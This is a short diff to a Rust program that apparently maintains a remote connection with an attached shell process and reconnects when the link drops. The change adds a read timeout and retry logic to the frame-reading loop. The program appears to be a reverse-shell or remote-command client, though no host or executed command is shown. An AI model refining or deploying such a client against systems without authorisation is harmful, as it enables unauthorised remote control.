@@ -43,16 +43,22 @@ fn main() {
         let stream = Arc::new(Mutex::new(stream));
         let mut shell: Option<Child> = None;
 
-        loop {
-            let frame = {
+        'inner: loop {
+            let frame = loop {
                 let mut s = stream.lock().unwrap();
-                read_frame(&mut *s)
-            };
-            let frame = match frame {
-                Ok(f) => f,
-                Err(e) => {
-                    eprintln!("[!] connection lost: {} (reconnecting in {}s)", e, RECONNECT_DELAY);
-                    break;
+                s.set_read_timeout(Some(Duration::from_millis(100))).ok();
+                match read_frame(&mut *s) {
+                    Ok(f) => break f,
+                    Err(ref e)
+                        if e.kind() == io::ErrorKind::WouldBlock
+                            || e.kind() == io::ErrorKind::TimedOut =>
+                    {
+                        continue;
+                    }
+                    Err(e) => {
+                        eprintln!("[!] connection lost: {} (reconnecting in {}s)", e, RECONNECT_DELAY);
+                        break 'inner;
+                    }
                 }
             };
 
